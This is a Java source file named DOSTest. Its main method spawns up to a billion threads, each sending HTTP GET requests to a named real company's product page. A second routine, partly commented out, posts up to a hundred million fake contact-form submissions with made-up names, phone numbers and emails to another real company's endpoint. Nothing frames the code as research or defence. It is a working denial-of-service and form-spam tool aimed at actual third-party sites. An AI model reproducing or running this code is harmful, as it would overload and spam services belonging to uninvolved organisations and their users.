package com.app.heike;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;

import com.cyb.url.SpiderHttpClient;

/**
 * 作者 : iechenyb<br>
 * 类描述: 说点啥<br>
 * 创建时间: 2017年10月26日
 */
public class DOSTest {
	Log log = LogFactory.getLog(DOSTest.class);

	public static void main(String[] args) {
		/*for (int i = 0; i < 10000 * 10000; i++) {//
			Map<String, String> data = new HashMap<String, String>();
			data.put("realname", "1234567890");
			data.put("company", "1234567890");
			data.put("mobile", "1383262354" + i % 10);
			data.put("email", i + "@qq.com");
			data.put("mintro", "1234567890");
			System.out.println(i + "---" + SpiderHttpClient.doPost("http://www.burgeon.cn/index/send", data));
		}*/
		try {
			for(int i=0;i<1000000000;i++){
				Runnable th = new Runnable() {
					public void run() {
						try {
							//DOSTest.test();
							SpiderHttpClient.doGet("http://barracuda.com.cn/products/");
						} catch (Exception e) {
							e.printStackTrace();
						} 
					}
				};
				new Thread(th).start();
			};
		} catch (Exception e) {
			e.printStackTrace();
			
		} 
	}

	public static void test() throws ClientProtocolException, IOException{
		String result = "";
		HttpPost httpRequst = new HttpPost("http://www.burgeon.cn/index/send");// 创建HttpPost对象
		
		try {
			
			for (int i = 0; i < 10000 * 10000; i++) {
				List<NameValuePair> params = new ArrayList<NameValuePair>();
				Map<String, String> data = new HashMap<String, String>();
				data.put("realname", "1234567890");
				data.put("company", "1234567890");
				data.put("mobile", "1383262354"+i%10);
				data.put("email", i+"@qq.com");
				data.put("mintro", "1234567890");
				for(String key :data.keySet()){
					params.add(new BasicNameValuePair(key, data.get(key)));
				}
				HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequst);
				httpRequst.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
				if (httpResponse.getStatusLine().getStatusCode() == 200) {
					HttpEntity httpEntity = httpResponse.getEntity();
					result = EntityUtils.toString(httpEntity);// 取出应答字符串
					System.out.println(i+"-->"+result);
				}
				params = null;
				data = null;
			}
			httpRequst.abort();
			httpRequst.releaseConnection();
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
			result = e.getMessage().toString();
		} catch (ClientProtocolException e) {
			e.printStackTrace();
			result = e.getMessage().toString();
		} catch (IOException e) {
			e.printStackTrace();
			result = e.getMessage().toString();
		}
	}
}
